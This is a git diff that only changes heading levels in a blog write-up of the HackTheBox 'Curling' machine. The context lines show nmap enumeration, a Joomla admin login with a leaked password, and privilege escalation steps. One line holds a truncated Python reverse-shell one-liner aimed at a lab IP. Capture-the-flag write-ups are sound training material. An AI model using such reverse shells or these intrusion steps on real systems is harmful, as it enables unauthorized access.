@@ -13,13 +13,13 @@ img_path: /assets/img/hackthebox/machines/curling
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Curling](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -49,7 +49,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Two open ports, 22 running OpenSSH and 80 is Apache web server with Joomla CMS.
 
-## Web
+### Web
 
 Let's navigate to the web page.
 
@@ -63,7 +63,7 @@ Going the first post, we see it's written by `Floris`, an checking the source co
 
 The secret file has a base64 encoded password.
 
-# **Foothold**
+## **Foothold**
 
 Using the username Floris and the password we found, we can login to the administrator page of Joomla.
 
@@ -87,9 +87,9 @@ export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pt
 
 ![](6.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
-## floris
+### floris
 
 Checking file inside floris's home directory, we find a file called password_backup with hexdump data.
 
@@ -103,7 +103,7 @@ Let's ssh to floris.
 
 ![](9.png)
 
-## root
+### root
 
 Checking the admin-area directory, we see two files that are being updated every minute.
 
